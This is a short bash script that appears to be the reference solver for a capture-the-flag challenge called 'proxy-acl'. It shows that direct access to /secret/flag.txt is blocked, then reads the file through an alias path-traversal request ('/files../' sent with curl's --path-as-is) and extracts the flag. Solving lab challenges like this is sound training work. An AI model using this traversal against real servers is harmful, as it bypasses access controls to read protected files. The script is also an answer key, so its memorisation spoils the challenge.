#!/usr/bin/env bash
# 05 · proxy-acl reference solver
# Usage: ./solve.sh http://TARGET:PORT
set -euo pipefail
BASE="${1:?usage: solve.sh http://host:port}"

echo "[*] Direct access is blocked:"
curl -s -o /dev/null -w "  /secret/flag.txt -> HTTP %{http_code}\n" "${BASE}/secret/flag.txt"

echo "[*] Bypass via alias traversal (--path-as-is keeps the ../ literal):"
curl -s --path-as-is "${BASE}/files../secret/flag.txt" | grep -oE 'SecurinetsENIT\{[^}]+\}'
